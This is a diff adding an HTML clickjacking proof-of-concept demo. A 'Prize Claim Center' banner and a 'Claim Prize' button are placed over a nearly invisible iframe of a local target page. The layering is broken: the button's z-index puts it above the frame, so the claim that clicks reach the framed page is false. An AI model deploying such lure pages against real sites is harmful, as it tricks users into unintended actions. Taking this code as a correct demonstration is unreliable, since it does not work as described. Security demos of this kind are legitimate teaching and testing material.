@@ -1,6 +1,40 @@
 <!doctype html>
 <html lang="en">
 <meta charset="utf-8">
+<title>Clickjacking PoC (Demo)</title>
+<style>
+  html, body { margin:0; height:100%; font-family:system-ui, Arial, sans-serif; background:#f7f9fc; }
+  .banner { background:#111827; color:#fff; padding:14px 20px; font-weight:600; text-align:center; }
+  /* Fake button that the victim sees */
+  .overlay-btn {
+    position:absolute; top:58%; left:50%; transform:translate(-50%,-50%);
+    padding:16px 28px; background:#1976d2; color:#fff; border-radius:10px;
+    box-shadow:0 6px 18px rgba(0,0,0,.2); font-size:1.15rem; z-index:10; cursor:pointer;
+  }
+  /* Framed target (nearly invisible) */
+  iframe.victim {
+    position:absolute; top:55%; left:50%; transform:translate(-50%,-50%);
+    width:900px; height:600px; border:1px solid #d0d7de; opacity:0.02; z-index:5;
+  }
+  .note { position:absolute; bottom:18px; left:0; right:0; text-align:center; color:#6b7280; }
+</style>
+<body>
+  <div class="banner">Prize Claim Center — Click the blue button to confirm</div>
+
+  <!-- Overlay button the victim thinks is benign -->
+  <a class="overlay-btn" href="#" onclick="alert('Overlay clicked; the real click lands on the framed page.'); return false;">
+    Claim Prize
+  </a>
+
+  <!-- Frame the local target so the demo always works -->
+  <iframe class="victim" src="target.html" sandbox="allow-forms allow-scripts"></iframe>
+
+  <div class="note">Demo: overlayed click lands on the framed page’s sensitive action.</div>
+</body>
+</html>
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
 <title>Clickjacking PoC</title>
 <style>
   body { margin: 0; font-family: Arial, sans-serif; text-align: center; }
